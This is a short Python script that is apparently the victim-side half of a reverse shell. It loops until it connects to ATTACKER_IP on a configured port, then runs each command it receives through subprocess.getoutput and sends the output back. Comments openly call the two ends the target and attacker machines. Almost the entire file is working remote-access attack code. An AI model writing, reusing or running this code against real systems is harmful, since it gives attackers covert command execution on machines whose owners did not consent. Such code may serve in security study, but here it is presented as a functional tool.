import socket
import subprocess
from config import *
from socket_with_buffer import Socket
from time import sleep

def main():
    # target machine is the client in TCP 
    client_socket = Socket()

    # periodically have target machine reach out to attacker machine
    while client_socket.connect(ATTACKER_IP, PORT_NUMBER) != 0:
        sleep(SLEEP_TIME)

    # receive and process user commands and return output
    while True:
        received_command = client_socket.receive()
        # print('message received is:', received_command) # debugging command
        command_output = subprocess.getoutput(received_command) # TODO: figure out how to make shell commands persist
        client_socket.send(command_output)


if __name__ == '__main__':
    main()

    